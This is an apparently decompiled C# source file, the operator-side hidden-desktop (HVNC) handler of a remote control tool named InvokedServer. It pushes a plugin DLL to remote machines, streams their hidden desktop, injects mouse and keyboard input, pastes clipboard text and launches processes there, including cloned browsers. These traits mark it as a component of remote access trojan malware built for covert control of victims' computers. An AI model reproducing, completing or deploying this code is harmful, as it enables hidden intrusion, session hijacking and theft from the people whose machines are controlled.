

using InvokedCommon.Enums;
using InvokedCommon.Messages;
using InvokedCommon.Networking;
using InvokedCommon.Structs;
using InvokedCommon.Video.Codecs;
using InvokedServer.DataStructs;
using InvokedServer.Enums;
using InvokedServer.Helper;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;


namespace InvokedServer.Messages
{
	public class HVNCHandler : MessageProcessorBase<Bitmap>, IDisposable
	{
		private string _pluginPath = "Plugins\\PluginHVNC.dll";
		private string _pluginName = "HVNC";
		private readonly object _syncLock = new object();
		private readonly object _sizeLock = new object();
		private Size _localResolution;
		public bool _enableOldGraphicsEngine;
		private readonly InvokedServer.Networking.Client _client;
		public UnsafeStreamCodec _codec;
		private Stopwatch _sFrameCapWatch;
		private const float TargetFrameTime = 0.001667f;
		private float _elapsedTime;
		private object _FPSlock = new object();
		private bool islocked;

		public event HVNCHandler.PluginStatusEventHandler PluginStatusChanged;

		private void OnPluginStatusChanged(PluginStatus value)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(val =>
			{
				HVNCHandler.PluginStatusEventHandler pluginStatusChanged = this.PluginStatusChanged;
				if (pluginStatusChanged == null)
					return;
				pluginStatusChanged((object)this, (PluginStatus)val);
			}), (object)value);
		}

		public event HVNCHandler.MessegeSizeHandler NewImageDataUpdate;

		private void OnNewImageDataUpdate(HVNCImageDataStruct value)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(val =>
			{
				HVNCHandler.MessegeSizeHandler newImageDataUpdate = this.NewImageDataUpdate;
				if (newImageDataUpdate == null)
					return;
				newImageDataUpdate((object)this, value);
			}), (object)value);
		}

		public bool IsStarted { get; set; }

		public Size LocalResolution
		{
			get
			{
				lock (this._sizeLock)
					return this._localResolution;
			}
			set
			{
				lock (this._sizeLock)
					this._localResolution = value;
			}
		}

		public HVNCHandler(InvokedServer.Networking.Client client)
		  : base(true)
		{
			this._client = client;
		}

		public override bool CanExecute(IMessage message)
		{
			switch (message)
			{
				case GetDesktopResponseHVNC _:
				case DoOptionHVNCResponse _:
				case SetHVNCStatus _:
					return true;
				default:
					return message is CheckPluginResponse;
			}
		}

		public override bool CanExecuteFrom(ISender sender) => this._client.Equals((object)sender);

		public override void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case GetDesktopResponseHVNC message1:
					this.Execute(sender, message1);
					break;
				case DoOptionHVNCResponse message2:
					this.Execute(sender, message2);
					break;
				case SetHVNCStatus message3:
					this.Execute(sender, message3);
					break;
				case CheckPluginResponse message4:
					this.Execute(sender, message4);
					break;
			}
		}

		public void CheckPluginStatus()
		{
			this._client.Send<CheckPlugin>(new CheckPlugin()
			{
				PluginName = this._pluginName
			});
		}

		public void BeginReceiveFrames(int quality)
		{
			lock (this._syncLock)
			{
				this.IsStarted = true;
				this._codec?.Dispose();
				this._codec = (UnsafeStreamCodec)null;
				this._client.Send<GetDesktopHVNC>(new GetDesktopHVNC()
				{
					HvncStatus = HVNCStatus.Start,
					CreateNew = true,
					Quality = quality
				});
			}
		}

		public void SetOldGraphicsEngine(bool enable) => this._enableOldGraphicsEngine = true;

		public void EndReceiveFrames()
		{
			lock (this._syncLock)
			{
				this.IsStarted = false;
				this._client.Send<GetDesktopHVNC>(new GetDesktopHVNC()
				{
					HvncStatus = HVNCStatus.Stop,
					Quality = 0
				});
			}
		}

		public void SendInputEvent(int msg, long wParam, long lParam)
		{
			lock (this._syncLock)
				this._client.Send<DoInputEventHVNC>(new DoInputEventHVNC()
				{
					HVNCImsg = msg,
					HVNCIwParam = wParam,
					HVNCIlParam = lParam
				});
		}

		public void StartProcess(string ProcessPath, string PresetProcess = null, bool CloneBrowser = false)
		{
			this._client.Send<DoNewProcessHVNC>(new DoNewProcessHVNC()
			{
				ProcessPath = ProcessPath,
				PresetProcess = PresetProcess,
				CloneBrowser = CloneBrowser
			});
		}

		public void DoOption(HvncOptions _options)
		{
			if (_options == HvncOptions.PasteClipboard)
			{
				string text = Clipboard.GetText();
				this._client.Send<DoOptionHVNC>(new DoOptionHVNC()
				{
					options = _options,
					data = text
				});
			}
			else
				this._client.Send<DoOptionHVNC>(new DoOptionHVNC()
				{
					options = _options
				});
		}

		private void Execute(ISender client, CheckPluginResponse message)
		{
			if (message.PluginName != this._pluginName)
				return;
			if (message.Status)
			{
				this.OnPluginStatusChanged(PluginStatus.Loaded);
			}
			else
			{
				this.OnPluginStatusChanged(PluginStatus.Installing);
				if (File.Exists(this._pluginPath))
					this._client.Send<DoPlugin>(new DoPlugin()
					{
						PluginName = this._pluginName,
						Data = Zip.Compress(File.ReadAllBytes(this._pluginPath))
					});
				else
					this.OnPluginStatusChanged(PluginStatus.PluginFileNotFound);
			}
		}

		private void Execute(ISender client, SetHVNCStatus message)
		{
			if (message.Status != HVNCStatus.CheckServer)
				return;
			client.Send<SetHVNCStatus>(new SetHVNCStatus()
			{
				Status = HVNCStatus.ResetClientFrameCount
			});
		}

		private bool CheckAgainstFPScap()
		{
			this._elapsedTime += (float)this._sFrameCapWatch.Elapsed.TotalSeconds;
			if ((double)this._elapsedTime < 0.0016670000040903687)
				return false;
			this._sFrameCapWatch = Stopwatch.StartNew();
			this._elapsedTime = 0.0f;
			return true;
		}

		private void Execute(ISender client, GetDesktopResponseHVNC message)
		{
			if (!this.IsStarted || message == null || message.Image == null)
				return;
			lock (this._syncLock)
			{
				if (this._codec == null || this._codec.ImageQuality != message.Quality || this._codec.Resolution != message.Resolution)
				{
					this._codec?.Dispose();
					this._codec = new UnsafeStreamCodec(message.Quality, 0, message.Resolution);
				}
				using (MemoryStream inStream = new MemoryStream(message.Image))
				{
					try
					{
						this.OnReport(new Bitmap((Image)this._codec.DecodeData((Stream)inStream), this.LocalResolution));
					}
					catch
					{
					}
				}
				double num1 = (double)message.Image.Length / 1024.0;
				double num2 = num1 / 1024.0;
				this.OnNewImageDataUpdate(new HVNCImageDataStruct(num2 < 1.0 ? string.Format("{0:F2} KB", (object)num1) : string.Format("{0:F2} MB", (object)num2), message.WindowCount));
			}
		}

		private void Execute(ISender client, DoOptionHVNCResponse message)
		{
			if (message.processIDs == null)
				return;
			MessageBox.Show(message.processIDs.ToString());
		}

		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize((object)this);
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposing)
				return;
			lock (this._syncLock)
			{
				this._codec?.Dispose();
				this.IsStarted = false;
			}
		}

		public delegate void PluginStatusEventHandler(object sender, PluginStatus value);

		public delegate void MessegeSizeHandler(object sender, HVNCImageDataStruct data);
	}
}